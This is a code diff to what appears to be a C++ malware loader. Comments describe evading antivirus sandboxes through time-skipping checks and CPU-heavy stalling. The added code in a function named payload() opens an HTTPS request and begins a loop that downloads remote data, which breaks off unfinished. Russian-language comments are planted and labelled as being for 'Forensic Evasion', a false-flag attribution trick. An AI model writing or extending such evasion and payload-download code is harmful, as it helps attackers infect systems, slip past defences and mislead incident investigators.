@@ -1,4 +1,5 @@
 
+добро пожаловать, товарищ
 
 //Time Skipping
 //Used to see if AV is using time skipping to speed up time to simulate execution
@@ -83,6 +84,8 @@ cout << "After Sleep";
 
 //Instead of Time skipping using CPU heavy algorithm to bog down
 
+
+//Это основная функция.
 //may want to change this to main function
 int payload () {
 
@@ -103,6 +106,34 @@ int payload () {
      WINHTTP_NO_REFERER, 
      WINHTTP_DEFAULT_ACCEPT_TYPES, 
      WINHTTP_FLAG_SECURE            // Required for HTTPS
-);
+    );
+
+     BOOL bResults = WinHttpSendRequest(hRequest,
+		WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+		WINHTTP_NO_REQUEST_DATA, 0,
+		0, 0);
+//Recieves Response
+	if (bResults)
+		bResults = WinHttpReceiveResponse(hRequest, NULL);
+
+	// iniitalize variables
+	DWORD dwSize = 0;
+	DWORD dwDownloaded = 0;
+	std::vector<char> buffer;
+	BOOL bDone = FALSE;
+
+	if (bResults) {
+		do {
+
+			dwSize = 0;
+			
+			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+				// handle error here.
+				break;
+			}
   
 }
+
+
+//Это мой проект
+//Leave Russian Comments for Forensic Evasion
